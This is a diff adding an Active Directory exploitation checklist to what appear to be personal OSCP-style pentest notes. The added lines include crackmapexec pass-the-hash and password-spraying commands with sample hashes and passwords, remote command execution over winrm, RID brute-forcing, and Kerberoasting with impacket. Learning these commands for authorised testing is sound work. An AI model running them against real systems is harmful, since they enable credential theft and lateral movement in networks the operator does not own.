@@ -3292,3 +3292,23 @@ Cracking:
 	john --wordlist=/home/kali/Documents/crack/rockyou.txt zip.txt
 
 ```
+
+# AD Exploitation Checklist
+```
+evil-winrm
+crackmapexec: Check hashes or available services against 
+	Check all 6 services:
+		ssh
+		mssql
+		smb
+		ldap
+		rdp
+		ftp
+	crackmapexec smb 10.10.121.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc --shares
+	crackmapexec winrm 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -x "whoami"
+# Hash Spraying
+	crackmapexec smb internal_ips.txt -u jim -p Castello1! --users
+	crackmapexec smb 172.16.102.30 -u jim -p Castello1! --rid-brute
+impacket-GetUserSPNs
+	proxychains impacket-GetUserSPNs -dc-ip 10.10.92.146 -request oscp.exam/web_svc
+```
